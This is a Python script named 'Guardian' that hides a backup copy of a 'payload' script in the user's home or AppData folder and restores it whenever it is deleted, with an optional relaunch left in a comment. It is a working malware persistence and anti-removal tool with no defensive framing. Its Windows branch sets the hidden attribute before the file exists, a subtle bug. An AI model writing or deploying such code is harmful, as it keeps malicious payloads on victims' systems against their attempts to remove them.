import os
import sys
import time
import subprocess
import logging
import shutil
import platform

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [Guardian] - %(message)s')

def create_hidden_backup(original_path):
    """
    Creates a hidden backup of the main script.
    """
    try:
        if platform.system() == "Windows":
            backup_path = os.path.join(os.environ["APPDATA"], ".payload_backup.py")
            subprocess.run(["attrib", "+H", backup_path], check=True)
        else: # Linux/macOS
            backup_path = os.path.join(os.path.expanduser("~"), ".payload_backup.py")

        shutil.copy2(original_path, backup_path)
        logging.info(f"Hidden backup created at {backup_path}")
        return backup_path
    except Exception as e:
        logging.error(f"Failed to create hidden backup: {e}")
        return None

def monitor_and_revive(main_script_path, backup_path):
    """
    Monitors the main script and revives it from the backup if it's deleted.
    """
    logging.info(f"Guardian is now monitoring {main_script_path}...")
    while True:
        if not os.path.exists(main_script_path):
            logging.warning(f"{main_script_path} has been deleted! Reviving from backup...")
            try:
                shutil.copy2(backup_path, main_script_path)
                logging.info("Main payload has been restored. Guardian will now exit.")
                # Optional: Relaunch the main script
                # subprocess.Popen([sys.executable, main_script_path])
                break # Exit after reviving
            except Exception as e:
                logging.error(f"Failed to revive main payload: {e}")

        time.sleep(5) # Check every 5 seconds

def main():
    if len(sys.argv) < 2:
        print("Usage: guardian.py <path_to_main_script>")
        sys.exit(1)

    main_script_path = sys.argv[1]

    # 1. Create a hidden backup of the main script
    backup_path = create_hidden_backup(main_script_path)
    if not backup_path:
        sys.exit(1)

    # 2. Start monitoring the main script
    monitor_and_revive(main_script_path, backup_path)

if __name__ == "__main__":
    main()